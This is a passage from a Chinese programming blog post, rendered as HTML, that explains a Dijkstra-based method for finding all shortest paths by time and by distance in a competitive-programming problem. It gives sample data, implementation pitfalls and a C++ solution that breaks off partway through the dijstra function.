class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7 9</span><br><span class=\"line\">0 4 1 1 1</span><br><span class=\"line\">1 6 1 3 1</span><br><span class=\"line\">2 6 1 1 1</span><br><span class=\"line\">2 5 1 2 2</span><br><span class=\"line\">3 0 0 1 1</span><br><span class=\"line\">3 1 1 3 1</span><br><span class=\"line\">3 2 1 2 1</span><br><span class=\"line\">4 5 0 2 2</span><br><span class=\"line\">6 5 1 2 1</span><br><span class=\"line\">3 5</span><br></pre></td></tr></table></figure>\n<h4 id=\"输出示例二\"><a href=\"#输出示例二\" class=\"headerlink\" title=\"输出示例二\"></a>输出示例二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5</span><br></pre></td></tr></table></figure>\n<h2 id=\"Dijstra算法\"><a href=\"#Dijstra算法\" class=\"headerlink\" title=\"Dijstra算法\"></a>Dijstra算法</h2><ul>\n<li>bfs+优先队列其实就是dijstra算法</li>\n<li>dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去</li>\n<li>不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ </li>\n</ul>\n<h2 id=\"Dijstra找出所有最短路径\"><a href=\"#Dijstra找出所有最短路径\" class=\"headerlink\" title=\"Dijstra找出所有最短路径\"></a>Dijstra找出所有最短路径</h2><ul>\n<li>从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。</li>\n<li>具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如<code>vector&lt;int&gt; parent[600]</code> ，则<code>parent[n]</code> 代表的vector就是编号为n的节点的parent list</li>\n<li>然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。</li>\n</ul>\n<h2 id=\"需要注意的点\"><a href=\"#需要注意的点\" class=\"headerlink\" title=\"需要注意的点\"></a>需要注意的点</h2><h4 id=\"不可以这样寻找同代价的不同parent-节点\"><a href=\"#不可以这样寻找同代价的不同parent-节点\" class=\"headerlink\" title=\"不可以这样寻找同代价的不同parent 节点\"></a>不可以这样寻找同代价的不同parent 节点</h4><ul>\n<li><p>代码</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class=\"line\"><span class=\"comment\">// 其实edge t就代表了节点me</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Edge_t</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> me;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> t;</span><br><span class=\"line\">    Edge_t(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> h, <span class=\"keyword\">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Edge_t &amp;x) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> x.t &lt; <span class=\"keyword\">this</span>-&gt;t; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (!que.empty()) &#123;</span><br><span class=\"line\">    Edge_t t = que.top();</span><br><span class=\"line\">    que.pop();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me)</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可能某<code>Edge h</code> 确实跟pop出来的<code>Edge t</code>是代表的是同一个节点——也就是<code>h.me==t.me</code> ，并且代价相同。但是在堆中，还有同等代价的<code>Edge p</code>，其终点不是<code>t.me</code> ——也就是<code>p.me!=t.me</code> ，然后该<code>Edge p</code> 在堆中的位置处在<code>Edge h</code> 前面，所以上面那个while就没办法获得<code>Edge h</code> 从而无法获取完整的parent list。</p>\n</li>\n<li><p>另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出<code>Edge t</code> 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里</p>\n</li>\n</ul>\n<h4 id=\"考虑自循环边\"><a href=\"#考虑自循环边\" class=\"headerlink\" title=\"考虑自循环边\"></a>考虑自循环边</h4><ul>\n<li>直接判断要求某点A邻接的点不与A相同即可实现</li>\n</ul>\n<h4 id=\"因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\"><a href=\"#因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\" class=\"headerlink\" title=\"因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\"></a>因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意</h4><ul>\n<li>dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法</li>\n</ul>\n<h4 id=\"INF的取值要注意\"><a href=\"#INF的取值要注意\" class=\"headerlink\" title=\"INF的取值要注意\"></a>INF的取值要注意</h4><ul>\n<li>dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得<code>INF+weight[i]</code>不再是INF</li>\n</ul>\n<h4 id=\"自己生成数据对拍时\"><a href=\"#自己生成数据对拍时\" class=\"headerlink\" title=\"自己生成数据对拍时\"></a>自己生成数据对拍时</h4><ul>\n<li>要注意不要生成多重边，网上很多ac的代码都是不支持多重边的</li>\n</ul>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INF 0x3f3f3f3f</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; adj;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Node v[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> length[<span class=\"number\">600</span>][<span class=\"number\">600</span>]; <span class=\"comment\">// length[i][j]记录从node i到node j的length</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> TIME[<span class=\"number\">600</span>][<span class=\"number\">600</span>]; <span class=\"comment\">// TIME[i][j]记录从node i到node j的用时</span></span><br><span class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; tp[<span class=\"number\">600</span>];<span class=\"comment\">// node's parent list</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> tpResult[<span class=\"number\">600</span>];<span class=\"comment\">// 最终的node的parent</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> BEGIN, END; <span class=\"comment\">// 题目输入的天梯队员的起点和要到达的终点</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> vertexCnt, edgeCnt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dijstra</span><span class=\"params\">(<span class=\"keyword\">int</span> weight[][<span class=\"number\">600</span>])</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DFS</span><span class=\"params\">(<span class=\"keyword\">bool</span> isLength)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">outp</span><span class=\"params\">(<span class=\"keyword\">int</span> f, <span class=\"keyword\">int</span> index)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n, m;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                TIME[i][j] = INF;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                length[i][j] = INF;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            v[i].index = i;</span><br><span class=\"line\">            v[i].adj.clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            tp[i].clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        vertexCnt = n, edgeCnt = m;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> v1, v2, one, l, t;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d%d\"</span>, &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t);</span><br><span class=\"line\">            v[v1].adj.push_back(v2);</span><br><span class=\"line\">            <span class=\"comment\">// 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可</span></span><br><span class=\"line\">            length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l;</span><br><span class=\"line\">            TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!one) &#123;</span><br><span class=\"line\">                v[v2].adj.push_back(v1);</span><br><span class=\"line\">                length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l;</span><br><span class=\"line\">                TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;BEGIN, &amp;END);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (BEGIN == END) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"; Distance = \"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class=\"string\">\" =&gt; \"</span> &lt;&lt; END &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; TIME[BEGIN][END] &lt;&lt; <span class=\"string\">\"; Distance = \"</span> &lt;&lt; length[BEGIN][END] &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class=\"string\">\" =&gt; \"</span> &lt;&lt; END &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> timeEND = dijstra(TIME);</span><br><span class=\"line\"><span class=\"comment\">//        outp(END, 0);</span></span><br><span class=\"line\">        DFS(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; r1, r2;</span><br><span class=\"line\">        r1.push_back(END);</span><br><span class=\"line\">        <span class=\"comment\">// 以下这种构造路径的方式是建立在起点不同于终点的情况下</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> tmp_tp = tpResult[END];</span><br><span class=\"line\">        r1.push_back(tmp_tp);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class=\"line\">            tmp_tp = tpResult[tmp_tp];</span><br><span class=\"line\">            r1.push_back(tmp_tp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reverse(r1.begin(), r1.end());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            tp[i].clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> lenEND = dijstra(length);</span><br><span class=\"line\"><span class=\"comment\">//        outp(END, 0);</span></span><br><span class=\"line\">        DFS(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        r2.push_back(END);</span><br><span class=\"line\">        tmp_tp = tpResult[END];</span><br><span class=\"line\">        r2.push_back(tmp_tp);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class=\"line\">            tmp_tp = tpResult[tmp_tp];</span><br><span class=\"line\">            r2.push_back(tmp_tp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reverse(r2.begin(), r2.end());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">bool</span> isSame = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (r1.size() == r2.size()) &#123;</span><br><span class=\"line\">            isSame = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size(); i++) &#123;</span><br><span class=\"line\">                isSame = (r1[i] == r2[i]) &amp;&amp; isSame;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isSame) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; timeEND &lt;&lt; <span class=\"string\">\"; Distance = \"</span> &lt;&lt; lenEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r1[r1.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; timeEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r1[r1.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Distance = \"</span> &lt;&lt; lenEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r2.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r2[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r2[r2.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Edge_t</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> me;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> t;</span><br><span class=\"line\">    Edge_t(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> h, <span class=\"keyword\">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Edge_t &amp;x) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> x.t &lt; <span class=\"keyword\">this</span>-&gt;t; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// bfs+优先队列其实就是dijstra算法</span></span><br><span class=\"line\"><span class=\"comment\">// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到</span></span><br><span class=\"line\"><span class=\"comment\">// 所以result set只会有node被加进去而不会有node被踢出去</span></span><br><span class=\"line\"><span class=\"comment\">// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dijstra</span><span class=\"params\">(<span class=\"keyword\">int</span> weight[][<span class=\"number\">600</span>])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> resWei[<span class=\"number\">600</span>];</span><br><span class=\"line\">    priority_queue&lt;Edge_t&gt; que;</span><br><span class=\"line\">    que.push(Edge_t(BEGIN, <span class=\"number\">0</span>, <span class=\"number\">0</span>));<span class=\"comment\">// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> visit[vertexCnt];  <span class=\"comment\">// 记录某点是否已经加入到dijstra的result set里</span></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(visit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(visit) * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">bool</span>));</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!que.empty()) &#123;</span><br><span class=\"line\">        Edge_t t = que.top();</span><br><span class=\"line\">        que.pop();</span><br><span class=\"line\">        <span 